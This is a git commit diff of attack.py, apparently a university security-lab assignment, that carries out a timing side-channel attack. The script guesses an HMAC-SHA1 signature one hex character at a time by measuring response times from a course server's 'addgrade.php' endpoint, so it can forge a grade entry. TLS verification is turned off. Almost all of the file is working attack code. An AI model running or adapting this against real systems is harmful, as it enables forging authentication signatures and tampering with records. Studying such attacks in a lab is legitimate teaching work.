56d571047fdb9da2c3889ebcf9530259ca5e694b
VikPet <viktor.pettersson@debricked.com>
2019-12-10 21:44:09 +0100

    Last changes

--- attack.py
+++ attack.py
@@ -2,6 +2,7 @@ import hmac
 import hashlib
 import requests
 import urllib3
+import time
 
 def getAverage(URL, parameters, iterations):
     total = 0
@@ -10,25 +11,23 @@ def getAverage(URL, parameters, iterations):
     return total / iterations
 
 if __name__ == '__main__':
+    start = time.time()
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Removes ssl related warnings. 
-    name = 'kalle'
-    grade = '5'
-    key = 'k'
+    name = 'Micaela'
+    grade = '4'
+    key = bytes('k', encoding='utf8')
     REAL_SIGNATURE = '0bd7fb428bea810a03c0'
     URL = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
     concat = bytes(name, encoding='utf8') + bytes(grade, encoding='utf8')
-    signature = hmac.new(bytes(key, encoding='utf8'), concat, hashlib.sha1).hexdigest()[:20]
-    
+    signature = hmac.new(key, concat, hashlib.sha1).hexdigest()[:20]
     elapsed = 0
-    #signature = list(signature)
-    bestChar = None
-    signature ='0bd7fb428bea810a03c0'
     signature = list(signature)
-    for i in range (18,20):
+    bestChar = None
+    for i in range (0,20):
         for char in '0123456789abcdef':
             signature[i] = char
             parameters = {'name':name, 'grade':grade, 'signature':''.join(signature)} 
-            average = getAverage(URL, parameters, 100)
+            average = getAverage(URL, parameters, 5)
             if (average > elapsed):
                 bestChar= char
                 elapsed = average
@@ -43,8 +42,10 @@ if __name__ == '__main__':
     parameters = {'name':name, 'grade':grade, 'signature':''.join(signature)}        
     result = requests.get(url = URL, params = parameters, verify=False)
     data = result.json()
-    print(data)
+
     if(data == 1):
         print("Success! Signature is:", ''.join(signature))
     else:
-        print("Unsuccessful answer from server is:", data)
+        print("Unsuccessful answer from server is:", data, "Signature:",signature)
+    end = time.time()
+    print("Time:", end - start)
